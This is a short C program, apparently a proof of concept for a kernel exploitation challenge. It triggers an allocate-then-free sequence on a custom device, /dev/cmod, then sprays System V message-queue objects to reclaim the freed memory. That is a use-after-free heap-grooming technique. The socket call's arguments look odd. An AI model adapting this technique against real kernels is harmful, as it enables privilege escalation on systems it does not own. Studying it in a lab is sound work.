#include<stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <signal.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>


#define DEVICE_FILE "/dev/cmod"
int fd;
struct {
  long mtype;
  char mtext[0x80];
} msgbuf;

void alloc(unsigned long size){
	read(fd,NULL,size);
}
void delete(){
	write(fd,NULL,0);
}
int main(){
	fd=open(DEVICE_FILE,O_RDWR);
	alloc(0x80);
	delete();
	socket(22,AF_INET,0);
	int qid;
  	if ((qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1) {
    		perror("msgget");
    		return -1;
  	}
	msgbuf.mtype = 1;
  	memset(msgbuf.mtext, 'A', sizeof(msgbuf.mtext));
	for(int i = 0; i < 0x1; i++) {
   		if (msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 48, 0) == -1) {
      			perror("msgsnd");
      			return -1;
    		}
  	}
	return 0;
}
